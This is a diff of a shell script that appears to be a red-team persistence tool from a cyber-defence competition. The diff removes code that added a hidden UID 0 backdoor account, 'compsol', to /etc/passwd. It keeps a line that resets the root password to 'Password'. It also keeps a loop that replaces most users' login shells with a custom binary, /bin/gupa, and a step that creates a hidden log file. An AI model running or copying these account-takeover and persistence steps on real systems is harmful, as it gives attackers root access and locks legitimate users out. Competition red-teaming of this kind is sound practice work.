@@ -59,21 +59,10 @@ chmod +x /bin/gupa
 touch /var/log/.BinaryBasinBandits
 chmod 722 /var/log/.BinaryBasinBandits
 
-if grep -q "compsol" /etc/passwd; then
-    echo "Idk already or smthn like that"
-else
-    if [ "$EUID" -eq 0 ]; then
-        echo "compsol:x:0:0::/home/compsol:/bin/bash" | tee -a /etc/passwd
-    else
-        sudo tee -a "compsol:x:0:0::/home/compsol:/bin/bash" /etc/passwd
-    fi
-    #edit the password
-    echo -e "Password\nPassword\n" | passwd "compsol"
-    echo -e "Password\nPassword\n" | passwd "root"
-fi
+echo -e "Password\nPassword\n" | passwd "root"
 
 while IFS=: read -r username _ _ _ _ _ shell; do
-    if [[ "$username" == *"whiteteam" || "$username" == *"blackteam" || "$username" == *"datadog" || "$username" == *"dd-dog" || *"$username" == *"compsol" || "$shell" == *"false" || "$username" == "root" || "$shell" == *"nologin" || "$shell" == *"sync" ]]; then
+    if [[ "$username" == *"whiteteam" || "$username" == *"blackteam" || "$username" == *"datadog" || "$username" == *"dd-dog" || "$username" == "root" || "$shell" == *"false" || "$shell" == *"nologin" || "$shell" == *"sync" ]]; then
         echo "pass $username"
     else
         sudo usermod --shell /bin/gupa "$username"
